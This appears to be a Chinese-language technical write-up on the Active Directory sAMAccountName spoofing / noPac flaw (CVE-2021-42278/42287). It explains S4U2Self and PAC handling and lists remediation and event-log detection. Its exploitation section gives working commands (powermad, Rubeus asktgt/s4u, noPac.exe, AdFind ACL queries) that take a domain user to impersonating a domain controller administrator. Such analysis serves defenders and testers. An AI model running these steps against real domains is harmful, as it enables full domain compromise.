* * *
**S4U2Self**
S4U包括和S4U2self和S4U2proxy。S4U2proxy允许服务代表用户获得不同服务的服务票证的扩展，通常用于服务进行委派，这里不再叙述，有兴趣可以看关于委派相关的章节。
这个漏洞出在S4U2Self上，先来了解一下认证流程。
`服务可以使用S4U2self将票证检索到自身，允许服务代表用户向自身获取Kerberos服务票据，包含用户的组，因此可用来授权，且S4U2self扩展可用于获取PAC，以确定用户是否对服务具有访问权限。`
下图描述了从服务处理TGS的S4U2self TGS-REQ消息。
1.服务使用S4U2self扩展来代表用户向自身检索服务票证。该服务填写PA-FOR-USER数据结构，并向TGS发送TGS-REQ。
2.如果TGS支持PA-FOR-USER扩展，TGS在TGS-REP中返回用户的ST票据。ST返回的PAC包含授权数据。
**PA-FOR-USER结构：**
    PA-FOR-USER ::= SEQUENCE {
           -- PA TYPE 129
           userName              [0] PrincipalName,
           userRealm              [1] Realm,            
           cksum                 [2] Checksum,             
           auth-package          [3] KerberosString
        }
PA-FOR-USER由四个字段组成：userName、userRealm、cksum和auth-package。
    userName为用户的名称，默认名称类型为NT-UNKNOWN。
    userRealm是用户帐户的当前域。
    auth-package字段必须设置为字符串“Kerberos”，并且不区分大小写。
    cksum为前三者的校验和。使用KERB_CHECKSUM_HMAC_MD5函数计算。
在微软官方文档中提到：
`如果KDC支持PAC，KDC必须将S4U填充的字段从TGT中的PAC复制到新创建的PAC，并在处理其支持的所有字段后，
KDC必须生成新的服务器签名和KDC签名，以替换PAC中的现有签名字段。`
即在S4U阶段创建了新的PAC，而新生成的PAC为后面的漏洞利用提供了充分条件。
**TGS-REP：**
1.检查自身是否存在服务，如果存在，通过krbtgt解密TGT并通过Login Session Key解密Authenticator(Login
Session Key加密时间戳)，就验证了对方身份。然后验证时间戳是否在范围内，并且验证TGT中的时间戳是否过期，原始地址是否和TGT保存的地址相同等。  
2.生成用AS-REP得到的Login Session Key加密后的用于确保安全传输的 **Server Session Key** 。  
3.完成认证后，TGS生成ST票据，其中包括：客户端信息和原始的Server Session Key，`整个ST票据由该服务的NTLM Hash加密。`  
4.将 **ST和Server Session Key** 发送给客户端。
结果可以看到在S4U2Self拓展在TGS-REQ中生成了新的高权限PAC用于访问申请的服务。
在申请ST票据时，kerberos找不到DC2这个用户，由于是机器账户会触发fallback自动添加$变为DC2$。 结果在 ST
中使用域控的密钥进行加密，进而可以模拟域控上任意服务的任意用户进行访问登陆。
由此可见S4U2Self阶段是漏洞触发的关键点，如果没有S4U2Self就不会生成新的高权限PAC，流程没有任何问题，只是在这之后没有做好鉴权：`PAC没有原始请求者的信息、KDC没有识别高权限ST作用于哪个机器账户`，从而产生了漏洞。
## 0x04 漏洞利用
###  整体流程
`假设域内DC机器名为DC1$`
1.利用域用户创建域机器Evil。
2.清除Evil的SPN属性。
3.将域机器Evil的sAMAccountName属性更改为DC1(不带$)。
4.为Evil请求TGT，随后将其sAMAccountName更改为其他名字(除DC1均可)。
5.通过S4U2self向KDC请求DC1的ST票据(可以任意指定service类型)；KDC找不到DC1这个机器账号,在DC1后面自动添加$匹配为DC1$(域控),从而返回域控机器账户代替DC1
的ST票证。
###  利用步骤
**1.利用域用户创建域机器Evilsystem**
域内任意域用户默认可以添加10台域机器，这是用于加域的正常功能，在LDAP中呈现的字段为ms-DS-MachineAccountQuota的值。
(1)powermad：
默认`会`自动为其创建机器注册SPN
以任意普通域用户创建一个名为Evilsystem，密码为1qaz[@WSX](https://github.com/WSX "@WSX")的域机器
`New-MachineAccount -MachineAccount Evilsystem -Password $(ConvertTo-SecureString "1qaz[@WSX](https://github.com/WSX "@WSX")" -AsPlainText -Force)`
(2)addcomputer.py
默认`不会`自动为其创建机器注册SPN
**2.清除Evilsystem的servicePrincipalName属性(addcomputer.py添加机器用户省略这一步骤)**
`Set-DomainObject "CN=Evilsystem,CN=Computers,DC=redteam,DC=lab" -Clear
'serviceprincipalname' -Verbose`
**3.将域机器Evilsystem的sAMAccountName属性更改为DC1(不带$)**
`Set-MachineAccountAttribute -MachineAccount "Evilsystem" -Value "DC1"
-Attribute samaccountname -Verbose`
**4.为Evilsystem请求TGT，随后将sAMAccountName更改为其他名字(除DC1均可)**
`Rubeus.exe asktgt /user:"DC1" /password:"1qaz[@WSX](https://github.com/WSX
"@WSX")" /domain:"redteam.lab" /dc:"DC1.redteam.lab" /nowrap`
`Set-MachineAccountAttribute -MachineAccount "Evilsystem" -Value "EvilEvil"
-Attribute samaccountname -Verbose`
**5.通过S4U2self向KDC请求DC1的ST票据(可以任意指定service类型)**
在这里模拟了administrator用户访问DC1上cifs服务的ST票据，[这可以是域中任何系统上任何服务上的任何用户](https://adsecurity.org/?page_id=183)。
（也可以申请host服务票据直接添加用户，或者直接申请ldap的票据进行dcsync。）
`Rubeus.exe s4u /self /impersonateuser:"administrator"
/altservice:"cifs/DC1.redteam.lab" /dc:"DC1.redteam.lab" /ptt
/ticket:doIEujCCBLag..`
验证结果
**公开EXP利用：**
`noPac.exe -domain redteam.lab -user carn1 -pass Qq123456.. /dc
dc1.redteam.lab /mAccount Evils /mPassword 1qaz[@WSX](https://github.com/WSX
"@WSX") /service cifs /ptt`
###  其他利用场景
`漏洞利用的最终条件就是在域控没打补丁的情况下，能够修改任意域机器的SPN和sAMAccountName属性进行滥用。`
**1.林信任利用**
[Charlie Clark在后面的文章中展示了林信任的利用方式](https://exploit.ph/more-samaccountname-impersonation.html)
A域和B域互相信任，如果有A域a用户的权限，可以利用信任关系在B域创建计算机账户达到漏洞利用。
**2.MAQ=0利用**
`前面的利用基于MAQ(MachineAccountQuota)创建域机器来实现，如果限制MAQ，有以下思路：`
( **1).CreatorSID**
按照微软的ACL规定，创建者即为所有者，所有者必定拥有完全控制权限，当然包括更改名称等一系列属性。
利用MAQ创建域机器利用的方式其实就是利用了CreatorSID属性，在一些域内有专门拉机器账户进域的用户，比如carn1用户将demo123机器拉入域内，则demo123的CreatorSID指向carn1。
通过SID查询Creator
`AdFind.exe -f "(&(objectsid=S-1-5-21-2588586899-1821113704-3426516109-2603))"
objectclass cn dn`
查询carn1对demo123的ACL权限
`AdFind.exe -b "CN=demo123,CN=Computers,DC=redteam,DC=lab"
nTSecurityDescriptor -sddlfilter ;;;;;"carn1" -sddl+++ -recmute`
在拿到一个域用户权限后，可以遍历LDAP查找具有CreatorSID属性的域机器和对应的域用户，如果我们已经有了对应的域用户权限，就可以利用这个用户修改对应域机器的属性来进行漏洞利用。
查找每个域机器的加域账号`AdFind.exe -b “DC=redteam,DC=lab” -f
“(&(samAccountType=805306369))” cn mS-DS-CreatorSID`
通过用户的sid查看哪些域机器是通过自己加入到域内的：  
`AdFind.exe -b "DC=redteam,DC=lab" -f "(&(samAccountType=805306369)(mS-DS-CreatorSID=UserSid))" cn sAMAccountType objectCategory`
( **2).ACL权限**
域内拿到A用户权限后，遍历ACL发现其对域机器B有 GenericAll /
GenericWrite等权限，可以通过A直接修改B的属性利用。遍历ACL分析通常用在穷途末路的时候，更适合做一个后门使用，具体使用依情况而定。
## 0x05 漏洞修复
1.打[KB5008102](https://support.microsoft.com/en-us/topic/kb5008102-active-directory-security-accounts-manager-hardening-changes-cve-2021-42278-5975b463-4c95-45e1-831a-d120004e258e)，
[KB5008380](https://support.microsoft.com/en-us/topic/kb5008380-authentication-updates-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041)补丁。
2.MAQ(MachineAccountQuota)属性值设为0。
3.遍历域内并清除相关可能被利用的ACL。
4.创建名为`PacRequestorEnforcement`type`REG_DWORD`的注册表`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Kdc`，并为其值设为`2`，这样的话旧的TGT就不再起作用，让入侵者以前生成的凭据无效。
## 0x06 日志分析
1.创建机器账号产生4741事件
2.删除SPN产生4742事件
3.将sAMAccountName改为DC1产生4781事件
4.申请TGT并改名产生4768、4781事件
5.通过S4U获取ST产生4769事件
在上述日志中，TGT和ST的申请在域内太过频繁、如果是通过impacket中的addcomputer.py添加的机器账号默认不会包含SPN、所以可随时监控4741(创建机器账号产生)、4781(更改sAMAccountName名称)来确保域内没有被滥用此漏洞，当然最重要的还是对漏洞进行修复。
## 0x07 参考